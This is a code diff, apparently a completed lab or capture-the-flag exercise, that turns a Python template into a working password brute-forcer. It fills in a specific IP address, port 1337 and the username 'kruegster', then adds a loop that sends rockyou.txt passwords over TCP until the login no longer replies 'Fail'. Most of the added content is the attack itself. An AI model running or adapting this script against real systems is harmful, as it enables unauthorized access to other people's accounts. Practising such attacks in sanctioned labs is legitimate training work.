@@ -26,8 +26,8 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
+host = "142.93.117.193" # IP address here
+port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
@@ -55,11 +55,42 @@ def brute_force():
             the Briong server.
     """
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+    username = "kruegster"
+    password = "" # Hint: use wordlist
 
 
 
+    words = open(wordlist,'r')
+
+    while True:
+        pwd = words.readline()
+        print(pwd)
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+
+        # Wait for username
+        data = s.recv(1024)
+        #print(data)
+
+        usr = "{}\n".format(username)
+        s.send(usr.encode())
+
+        # Wait for password
+        data = s.recv(1024)
+        #print(data)
+        pw = "{}\n".format(pwd)
+        s.send(pw.encode())
+
+        # Wait for result
+        data = s.recv(1024)
+        #print(data)
+
+        fail = b"Fail\n"
+
+        if(data != fail):
+            print("Password found!: {}".format(pwd))
+            break
 
 if __name__ == '__main__':
     brute_force()
